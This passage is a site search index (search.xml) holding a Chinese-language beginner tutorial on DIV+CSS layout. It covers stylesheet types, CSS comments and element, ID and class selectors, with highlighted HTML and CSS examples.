<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>DIV与CSS基础详解</title>
    <url>/2025/12/05/DIV%E4%B8%8ECSS%E5%9F%BA%E7%A1%80%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<h2 id="1-DIV和CSS样式"><a href="#1-DIV和CSS样式" class="headerlink" title="1. DIV和CSS样式"></a>1. DIV和CSS样式</h2><p><strong>详细解释：</strong></p>
<ul>
<li><strong>DIV</strong> 是HTML中的一个块级元素，用于将文档分割为独立的区块。它本身没有特定的语义，主要作为容器使用，通过CSS来定义其外观和布局。</li>
<li><strong>CSS</strong>（层叠样式表）是一种描述HTML或XML文档外观和格式的样式表语言。CSS的核心理念是将内容与表现分离，使网页结构更清晰、更易于维护。</li>
</ul>
<p><strong>为什么使用DIV+CSS：</strong></p>
<ul>
<li>与传统的表格布局相比，DIV+CSS布局更加灵活、代码更简洁</li>
<li>提高网页加载速度（减少冗余HTML标签）</li>
<li>更好的SEO优化（搜索引擎更容易抓取内容）</li>
<li>便于后期维护和修改</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>DIV+CSS示例<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.container</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">80%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">0</span> auto;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#ccc</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.header</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#333</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: white;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.content</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.sidebar</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">25%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#f0f0f0</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">15px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.main</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">75%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">15px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.footer</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#333</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: white;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-top</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;header&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h1</span>&gt;</span>我的网站<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;content&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;sidebar&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span>导航栏<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>关于<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>服务<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;main&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span>主要内容区域<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">p</span>&gt;</span>这里是网站的主要内容...<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;footer&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>© 2023 我的网站. 保留所有权利.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="2-样式表类型"><a href="#2-样式表类型" class="headerlink" title="2. 样式表类型"></a>2. 样式表类型</h2><h3 id="2-1-嵌入样式表"><a href="#2-1-嵌入样式表" class="headerlink" title="2.1 嵌入样式表"></a>2.1 嵌入样式表</h3><p><strong>详细解释：</strong></p>
<ul>
<li>在HTML文档的<code>&lt;head&gt;</code>部分使用<code>&lt;style&gt;</code>标签定义CSS样式</li>
<li>适用于单页应用或小型网站</li>
<li>优点：样式与内容在同一文件，无需额外HTTP请求</li>
<li>缺点：无法跨页面共享样式，不利于大型项目维护</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>嵌入样式表示例<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="comment">/* 全局样式 */</span></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-family</span>: <span class="string">&quot;Microsoft YaHei&quot;</span>, sans-serif;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">line-height</span>: <span class="number">1.6</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="number">#333</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        </span></span><br><span class="line"><span class="language-css">        <span class="comment">/* 类选择器 */</span></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.highlight</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#ffffcc</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">3px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        </span></span><br><span class="line"><span class="language-css">        <span class="comment">/* ID选择器 */</span></span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#main-title</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="number">#0066cc</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-bottom</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        </span></span><br><span class="line"><span class="language-css">        <span class="comment">/* 伪类选择器 */</span></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">a</span><span class="selector-pseudo">:hover</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-decoration</span>: underline;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="number">#ff6600</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">&quot;main-title&quot;</span>&gt;</span>嵌入样式表示例<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;highlight&quot;</span>&gt;</span>这是一个使用嵌入样式表的示例。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>悬停查看效果<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="2-2-外部样式表"><a href="#2-2-外部样式表" class="headerlink" title="2.2 外部样式表"></a>2.2 外部样式表</h3><p><strong>详细解释：</strong></p>
<ul>
<li>将CSS代码保存在单独的<code>.css</code>文件中，通过<code>&lt;link&gt;</code>标签或<code>@import</code>语句引入</li>
<li>优点：样式与内容分离，便于维护；样式可跨页面共享；浏览器可缓存CSS文件</li>
<li>最佳实践：将CSS文件放在<code>&lt;head&gt;</code>中，避免”无样式内容闪烁”(FOUC)</li>
</ul>
<p><strong>示例：</strong></p>
<ol>
<li>创建<code>styles.css</code>文件：</li>
</ol>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 全局重置 */</span></span><br><span class="line">* &#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 布局样式 */</span></span><br><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">90%</span>;</span><br><span class="line">    <span class="attribute">max-width</span>: <span class="number">1200px</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span> auto;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 导航栏样式 */</span></span><br><span class="line"><span class="selector-class">.navbar</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#222</span>;</span><br><span class="line">    <span class="attribute">color</span>: white;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">10px</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.navbar</span> <span class="selector-tag">ul</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">    <span class="attribute">list-style</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.navbar</span> <span class="selector-tag">li</span> &#123;</span><br><span class="line">    <span class="attribute">margin-right</span>: <span class="number">20px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.navbar</span> <span class="selector-tag">a</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: white;</span><br><span class="line">    <span class="attribute">text-decoration</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 卡片样式 */</span></span><br><span class="line"><span class="selector-class">.card</span> &#123;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#ddd</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">15px</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">15px</span> <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">2px</span> <span class="number">5px</span> <span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0.1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>在HTML中引入：</li>
</ol>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>外部样式表示例<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 推荐方式：使用link标签 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;styles.css&quot;</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 不推荐但可行的方式：使用@import --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;style&gt;</span></span><br><span class="line"><span class="comment">        @import url(&quot;styles.css&quot;);</span></span><br><span class="line"><span class="comment">    &lt;/style&gt; --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">nav</span> <span class="attr">class</span>=<span class="string">&quot;navbar&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>产品<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>服务<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>联系我们<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;card&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h2</span>&gt;</span>欢迎访问<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>这是一个使用外部样式表的示例。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="2-3-内联样式"><a href="#2-3-内联样式" class="headerlink" title="2.3 内联样式"></a>2.3 内联样式</h3><p><strong>详细解释：</strong></p>
<ul>
<li>直接在HTML元素的<code>style</code>属性中定义CSS样式</li>
<li>优先级最高，但最不推荐使用</li>
<li>仅适用于特殊场景（如动态生成的样式、邮件HTML等）</li>
<li>严重违反内容与表现分离原则</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>内联样式示例<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;width: 300px; height: 200px; background-color: #4CAF50; </span></span></span><br><span class="line"><span class="string"><span class="tag">                border: 2px solid #333; border-radius: 5px; </span></span></span><br><span class="line"><span class="string"><span class="tag">                padding: 15px; color: white; text-align: center;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h3</span> <span class="attr">style</span>=<span class="string">&quot;margin-top: 0;&quot;</span>&gt;</span>内联样式示例<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;line-height: 1.5;&quot;</span>&gt;</span>这是直接在元素中定义的样式。<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        优先级高于外部和嵌入样式表。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">style</span>=<span class="string">&quot;background: #fff; color: #4CAF50; border: none; </span></span></span><br><span class="line"><span class="string"><span class="tag">                      padding: 8px 15px; border-radius: 3px; </span></span></span><br><span class="line"><span class="string"><span class="tag">                      cursor: pointer;&quot;</span>&gt;</span>点击我<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>注意：内联样式会使HTML代码变得混乱，难以维护，<span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">&quot;color: red; font-weight: bold;&quot;</span>&gt;</span>不建议在实际项目中使用<span class="tag">&lt;/<span class="name">span</span>&gt;</span>。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="3-注释"><a href="#3-注释" class="headerlink" title="3. 注释"></a>3. 注释</h2><p><strong>详细解释：</strong></p>
<ul>
<li>CSS注释使用<code>/* 注释内容 */</code>语法</li>
<li>注释可以跨多行</li>
<li>用于解释代码、临时禁用样式、团队协作等</li>
<li>不会被浏览器解析和渲染</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">    全局样式重置</span></span><br><span class="line"><span class="comment">    作者：张三</span></span><br><span class="line"><span class="comment">    日期：2023-10-15</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">* &#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 主标题样式 - 重要：不要修改此样式 */</span></span><br><span class="line"><span class="selector-id">#main-title</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#0066cc</span>;</span><br><span class="line">    <span class="comment">/* font-size: 24px; 临时禁用字体大小设置 */</span></span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">    <span class="attribute">margin-bottom</span>: <span class="number">20px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">    导航栏样式</span></span><br><span class="line"><span class="comment">    包含水平导航和响应式设计</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="selector-class">.navbar</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#222</span>;</span><br><span class="line">    <span class="attribute">color</span>: white;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">10px</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">/* 以下样式用于响应式设计</span></span><br><span class="line"><span class="comment">    @media (max-width: 768px) &#123;</span></span><br><span class="line"><span class="comment">        display: none;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="4-样式选择器"><a href="#4-样式选择器" class="headerlink" title="4. 样式选择器"></a>4. 样式选择器</h2><h3 id="4-1-元素选择器"><a href="#4-1-元素选择器" class="headerlink" title="4.1 元素选择器"></a>4.1 元素选择器</h3><p><strong>详细解释：</strong></p>
<ul>
<li>选择所有指定类型的HTML元素</li>
<li>语法：<code>元素名 { 属性: 值; }</code></li>
<li>适用于需要统一设置某类元素样式的场景</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 选择所有段落元素 */</span></span><br><span class="line"><span class="selector-tag">p</span> &#123;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">16px</span>;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">1.5</span>;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#333</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 选择所有h1-h6标题元素 */</span></span><br><span class="line"><span class="selector-tag">h1</span>, <span class="selector-tag">h2</span>, <span class="selector-tag">h3</span>, <span class="selector-tag">h4</span>, <span class="selector-tag">h5</span>, <span class="selector-tag">h6</span> &#123;</span><br><span class="line">    <span class="attribute">font-family</span>: <span class="string">&quot;Microsoft YaHei&quot;</span>, sans-serif;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#0066cc</span>;</span><br><span class="line">    <span class="attribute">margin-bottom</span>: <span class="number">15px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 选择所有无序列表和有序列表 */</span></span><br><span class="line"><span class="selector-tag">ul</span>, <span class="selector-tag">ol</span> &#123;</span><br><span class="line">    <span class="attribute">margin-left</span>: <span class="number">20px</span>;</span><br><span class="line">    <span class="attribute">list-style-type</span>: disc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4-2-ID选择器"><a href="#4-2-ID选择器" class="headerlink" title="4.2 ID选择器"></a>4.2 ID选择器</h3><p><strong>详细解释：</strong></p>
<ul>
<li>选择具有特定id属性的元素</li>
<li>语法：<code>#id名 { 属性: 值; }</code></li>
<li>优先级高于类选择器</li>
<li>每个id在页面中应唯一</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 选择id为&quot;main-header&quot;的元素 */</span></span><br><span class="line"><span class="selector-id">#main-header</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#333</span>;</span><br><span class="line">    <span class="attribute">color</span>: white;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">20px</span>;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 选择id为&quot;contact-form&quot;的表单元素 */</span></span><br><span class="line"><span class="selector-id">#contact-form</span> &#123;</span><br><span class="line">    <span class="attribute">max-width</span>: <span class="number">600px</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span> auto;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">20px</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#ddd</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4-3-类选择器"><a href="#4-3-类选择器" class="headerlink" title="4.3 类选择器"></a>4.3 类选择器</h3><p><strong>详细解释：</strong></p>
<ul>
<li>选择具有特定class属性的元素</li>
<li>语法：<code>.类名 { 属性: 值; }</code></li>
<li>可以应用于多个元素</li>
<li>优先级低于ID选择器，高于元素选择器</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 选择所有class为&quot;btn&quot;的元素 */</span></span><br><span class="line"><span class="selector-class">.btn</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: inline-block;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">8px</span> <span class="number">15px</span>;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#0066cc</span>;</span><br><span class="line">    <span class="attribute">color</span>: white;</span><br><span class="line">    <span class="attribute">text-decoration</span>: none;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">3px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 选择class为&quot;btn-primary&quot;的元素 */</span></span><br><span class="line"><span class="selector-class">.btn-primary</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#0066cc</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 选择class为&quot;btn-danger&quot;的元素 */</span></span><br><span class="line"><span class="selector-class">.btn-danger</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#cc0000</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 选择同时具有&quot;btn&quot;和&quot;large&quot;类的元素 